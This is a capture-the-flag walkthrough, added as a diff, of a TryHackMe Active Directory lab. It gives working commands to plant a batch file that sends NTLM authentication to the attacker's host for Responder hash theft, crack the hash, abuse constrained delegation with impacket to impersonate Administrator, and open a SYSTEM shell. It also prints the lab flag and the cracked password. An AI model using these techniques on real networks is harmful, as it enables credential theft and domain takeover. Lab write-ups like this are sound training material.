@@ -1,0 +1,352 @@
+================================================================================
+TryHackMe - PROXY (ctf.local) - Full Walkthrough
+================================================================================
+Target : DC01 (10.48.144.61) - Windows Server 2019 - Domain Controller
+Domain : ctf.local
+Goal   : Capture the Administrator flag on DC01
+
+Attack chain summary
+--------------------
+1. Anonymous read/write on SMB share "IT-Shared"
+2. Share files leak service accounts (svc.scanner, svc.mssql) and a file
+   scanner service that runs every 2 minutes and executes files from the share
+3. Upload a .bat file that triggers an SMB connection back to us
+   -> Responder captures svc.scanner's NTLMv2 hash
+4. Crack the hash with john -> svc.scanner:1summerlove!
+5. LDAP enumeration reveals svc.scanner has CONSTRAINED DELEGATION to
+   cifs/DC01 (msDS-AllowedToDelegateTo)
+6. impacket-getST (S4U2Self + S4U2Proxy) -> Administrator service ticket
+7. impacket-smbexec with the forged ticket -> SYSTEM shell on DC01
+8. Read C:\Users\Administrator\Desktop\flag.txt
+
+Flag : THM{S4U2S3lf_C0nstr41ned_D3l3g4t10n_2_DA}
+
+================================================================================
+STEP 0 - Reconnaissance / Host discovery
+================================================================================
+
+Ping the host:
+
+    ping 10.48.144.61
+    -> ttl=126 (Windows), ~90% packet loss (ICMP rate-limited), host is up.
+
+Full service scan on the common AD/Windows ports:
+
+    nmap -sV -sC -p 53,88,135,139,389,445,636,3268,3269,3389,5985,5986 10.48.144.61
+
+Key findings:
+    - 53/tcp   Simple DNS Plus (AD-integrated DNS)
+    - 88/tcp   Kerberos (Windows Kerberos, server time 13:18:43Z)
+    - 135/tcp  MSRPC
+    - 139/tcp  NetBIOS-SSN
+    - 389/tcp  LDAP -> Domain: ctf.local, Site: Default-First-Site-Name
+    - 445/tcp  SMB (microsoft-ds?)
+    - 636/3269 tcpwrapped (LDAPS/GC-SSL)
+    - 3268/tcp LDAP GC
+    - 3389/tcp RDP (dc01.ctf.local, product 10.0.17763 = Server 2019)
+    - 5985/5986 filtered (WinRM)
+
+RDP NTLM info confirmed:
+    DNS_Domain_Name   : ctf.local
+    DNS_Computer_Name : DC01.ctf.local
+    NetBIOS name      : CTF / DC01
+
+================================================================================
+STEP 1 - DNS enumeration
+================================================================================
+
+Zone apex and SOA:
+
+    dig @10.48.144.61 ctf.local ANY
+        ctf.local  A   10.48.144.61
+        ctf.local  NS  dc01.ctf.local
+        ctf.local  SOA dc01.ctf.local hostmaster.ctf.local ...
+
+DC SRV record:
+
+    dig @10.48.144.61 _ldap._tcp.dc._msdcs.ctf.local SRV
+        _ldap._tcp.dc._msdcs.ctf.local SRV 0 100 389 dc01.ctf.local
+
+Zone transfer is refused (dig axfr fails).
+
+Add the DC to /etc/hosts for later Kerberos/LDAP tooling:
+
+    echo "10.48.144.61 dc01.ctf.local dc01" >> /etc/hosts
+
+================================================================================
+STEP 2 - LDAP anonymous enumeration
+================================================================================
+
+Anonymous base query (RootDSE):
+
+    ldapsearch -x -H ldap://10.48.144.61 -s base
+
+Confirms:
+    - defaultNamingContext      : DC=ctf,DC=local
+    - domainFunctionality       : 7 (Server 2016 functional level)
+    - dnsHostName               : DC01.ctf.local
+    - supportedSASLMechanisms   : GSSAPI, GSS-SPNEGO, EXTERNAL, DIGEST-MD5
+
+Anonymous subtree queries are blocked ("a successful bind must be completed").
+
+================================================================================
+STEP 3 - SMB share enumeration (anonymous)
+================================================================================
+
+List shares:
+
+    smbclient -L //10.48.144.61 -N
+
+        ADMIN$          Disk  Remote Admin
+        C$              Disk  Default share
+        IPC$            IPC   Remote IPC
+        IT-Shared       Disk  IT Department Shared Resources
+        NETLOGON        Disk  Logon server share
+        SYSVOL          Disk  Logon server share
+
+Anonymous access:
+
+    smbclient //10.48.144.61/IT-Shared -N
+    ls
+        IT-Credentials-Backup.txt
+        IT-Onboarding-Checklist.txt
+        IT-Portal.html
+
+    (SYSVOL / NETLOGON / ADMIN$ require auth -> access denied)
+
+Download the files:
+
+    smbclient //10.48.144.61/IT-Shared -N
+    get IT-Credentials-Backup.txt
+    get IT-Onboarding-Checklist.txt
+    get IT-Portal.html
+
+----------------------------------------------------------------------
+IT-Credentials-Backup.txt
+----------------------------------------------------------------------
+    IT Department - Credentials Backup
+    helpdesk.bob  :  Welcome123!    [DISABLED - left company 2021]
+    it.admin      :  ITAdmin2019!   [DISABLED - role change 2022]
+    NOTE: These accounts have been disabled. Active service accounts
+          are managed separately by the sysadmin team.
+
+    (Red herring - accounts are disabled but NTLM still authenticates;
+     they grant almost nothing.)
+
+----------------------------------------------------------------------
+IT-Onboarding-Checklist.txt
+----------------------------------------------------------------------
+    Automated Services
+    ------------------
+      File Scanner (svc.scanner)
+        Runs every 2 minutes. Enumerates IT-Shared for new files to process.
+        Uses Shell enumeration to inspect file metadata and icons.
+      Database Backup (svc.mssql)
+        Handles nightly MSSQL backups. Member of Backup Operators.
+        Password rotated quarterly -- do not store locally.
+
+    KEY INTEL:
+      - A scheduled service account svc.scanner runs every 2 minutes and
+        processes files placed in IT-Shared.
+      - svc.mssql is a service account that is a member of Backup Operators
+        (important later / a second target).
+
+----------------------------------------------------------------------
+IT-Portal.html
+----------------------------------------------------------------------
+    - "Logged in as: svc.scanner"  (scanner runs as svc.scanner)
+    - References other users: j.smith, m.jones, svc.helpdesk
+    - Service table: DC01, SRV01 (Backup Agent), SRV02 (Monitoring) - fake/decoys
+
+================================================================================
+STEP 4 - User enumeration (Kerberos)
+================================================================================
+
+Create a username wordlist from the clues:
+
+    users.txt:
+        helpdesk.bob
+        it.admin
+        svc.scanner
+        svc.mssql
+        svc.helpdesk
+
+Kerberos pre-auth user enumeration:
+
+    kerbrute userenum -d ctf.local --dc 10.48.144.61 users.txt
+
+    [+] VALID USERNAME: svc.mssql@ctf.local
+    [+] VALID USERNAME: svc.scanner@ctf.local
+
+ASREP roast attempt (no pre-auth): no users have UF_DONT_REQUIRE_PREAUTH.
+
+Password spray of the leaked creds:
+
+    crackmapexec smb 10.48.144.61 -u helpdesk.bob -p 'Welcome123!'
+    [+] ctf.local\helpdesk.bob:Welcome123!
+    crackmapexec smb 10.48.144.61 -u it.admin -p 'ITAdmin2019!'
+    [+] ctf.local\it.admin:ITAdmin2019!
+
+    BUT: --shares/--users/--groups all fail with STATUS_ACCESS_DENIED, and
+    Kerberos says KDC_ERR_CLIENT_REVOKED -> the accounts are indeed disabled.
+    They are NOT the intended foothold.
+
+================================================================================
+STEP 5 - Initial foothold: capture svc.scanner hash (Responder + .bat)
+================================================================================
+
+The checklist says the scanner "Runs every 2 minutes" and "Enumerates
+IT-Shared for new files to process" and USES SHELL ENUMERATION -> it
+EXECUTES files dropped in the share as svc.scanner.
+
+Plan: drop a .bat file that makes the scanner connect back to us over SMB,
+harvest its NTLMv2 hash with Responder, then crack the password.
+
+NOTE: First attempts used SCF/LNK files with IconFile pointing at our IP
+(\\192.168.164.33\share\icon.ico). These did NOT trigger a callback because
+SCF/LNK icon resolution only happens in Explorer GUI rendering, not in a
+scheduled PowerShell/Shell task. The working payload is a .bat file.
+
+Get our VPN IP:
+
+    ip a            -> tun0: 192.168.164.33
+
+1) Start Responder on the VPN interface (separate terminal, root):
+
+    sudo responder -I tun0
+
+2) Create the malicious batch file:
+
+    printf '@echo off\nnet use \\\\192.168.164.33\\share\n' > scan.bat
+
+3) Upload it to the writable share:
+
+    smbclient //10.48.144.61/IT-Shared -N -c "put scan.bat"
+
+4) Within ~2 minutes the scanner executes scan.bat as svc.scanner.
+   `net use \\192.168.164.33\share` attempts NTLM authentication to us.
+
+5) Responder output (Responder-Session.log):
+
+    [SMB] NTLMv2-SSP Client   : 10.48.144.61
+    [SMB] NTLMv2-SSP Username : CTF\svc.scanner
+    [SMB] NTLMv2-SSP Hash     : svc.scanner::CTF:826421be5aa786ba:1D73E9...
+
+    Hash saved to /usr/share/responder/logs/SMB-NTLMv2-SSP-10.48.144.61.txt
+
+================================================================================
+STEP 6 - Crack the NTLMv2 hash
+================================================================================
+
+Save the hash and crack with john (hashcat had no usable GPU driver):
+
+    john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+    1summerlove!     (svc.scanner)
+
+=> Credentials: ctf.local\svc.scanner:1summerlove!
+
+================================================================================
+STEP 7 - Authenticated enumeration
+================================================================================
+
+Verify creds and enumerate shares:
+
+    nxc smb 10.48.144.61 -d ctf.local -u svc.scanner -p '1summerlove!' --shares
+
+        ADMIN$    -  (no access)
+        C$        -  (no access)
+        IPC$      -  READ
+        IT-Shared -  READ,WRITE
+        NETLOGON  -  READ
+        SYSVOL    -  READ
+
+WinRM:
+
+    nxc winrm 10.48.144.61 -u svc.scanner -p '1summerlove!'
+    -> [-] logon failure (not in Remote Management Users)
+
+BloodHound collection (partial - computer node timed out, but users/groups
+collected):
+
+    bloodhound-python -d ctf.local -u svc.scanner -p '1summerlove!' \
+        -c All -ns 10.48.144.61 --dns-tcp
+
+Direct LDAP query for delegation (most reliable):
+
+    ldapsearch -x -H ldap://10.48.144.61 -D "CTF\svc.scanner" \
+        -w '1summerlove!' -b "DC=ctf,DC=local" \
+        "(sAMAccountName=svc.scanner)" msDS-AllowedToDelegateTo userAccountControl memberOf servicePrincipalName
+
+    msDS-AllowedToDelegateTo: cifs/DC01
+    msDS-AllowedToDelegateTo: cifs/DC01.ctf.local
+    servicePrincipalName:     scanner/DC01
+    servicePrincipalName:     scanner/DC01.ctf.local
+
+    => svc.scanner has CONSTRAINED DELEGATION to cifs/DC01!
+
+================================================================================
+STEP 8 - Constrained Delegation attack (S4U2Self / S4U2Proxy)
+================================================================================
+
+With constrained delegation we can impersonate ANY user (here:
+Administrator) against cifs/DC01 via Kerberos S4U2Self+S4U2Proxy.
+
+Forge a service ticket:
+
+    cd /tmp/opencode/crack
+    impacket-getST -dc-ip 10.48.144.61 \
+        ctf.local/svc.scanner:'1summerlove!' \
+        -spn cifs/DC01.CTF.LOCAL \
+        -impersonate Administrator
+
+    [*] Getting TGT for user
+    [*] Impersonating Administrator
+    [*] Requesting S4U2self
+    [*] Requesting S4U2Proxy
+    [*] Saving ticket in Administrator@cifs_DC01.CTF.LOCAL@CTF.LOCAL.ccache
+
+================================================================================
+STEP 9 - Shell as Administrator (SYSTEM) on DC01
+================================================================================
+
+Load the ticket and get a CIFS/SMB shell with smbexec:
+
+    export KRB5CCNAME=/tmp/opencode/crack/Administrator@cifs_DC01.CTF.LOCAL@CTF.LOCAL.ccache
+    printf 'whoami\ntype C:\\Users\\Administrator\\Desktop\\flag.txt\nexit\n' | \
+        timeout 90 impacket-smbexec -no-pass -k \
+        ctf.local/Administrator@DC01.CTF.LOCAL -dc-ip 10.48.144.61
+
+    C:\Windows\system32> nt authority\system
+    C:\Windows\system32> THM{S4U2S3lf_C0nstr41ned_D3l3g4t10n_2_DA}
+
+================================================================================
+FLAG
+================================================================================
+
+    THM{S4U2S3lf_C0nstr41ned_D3l3g4t10n_2_DA}
+
+================================================================================
+Cleanup
+================================================================================
+
+Remove the files planted on the share:
+
+    smbclient //10.48.144.61/IT-Shared -N -c "del scan.bat; del scan.lnk; del scan.scf; del test.txt"
+
+Stop Responder: Ctrl-C in its terminal.
+
+================================================================================
+Key takeaways
+================================================================================
+- Writable SMB shares + scheduled file-processing tasks = code execution.
+- A .bat that triggers an SMB UNC connection is a reliable NTLM hash
+  theft primitive (Responder), whereas SCF/LNK icon tricks often only
+  work in Explorer.
+- Disabled accounts can still authenticate (NTLM) while being revoked
+  for Kerberos - don't waste time on them.
+- Constrained delegation (msDS-AllowedToDelegateTo) to cifs/<host> allows
+  impersonation of any principal (e.g. Administrator) using getST.
+- Validate delegation targets directly via LDAP if BloodHound collection
+  fails.
+================================================================================
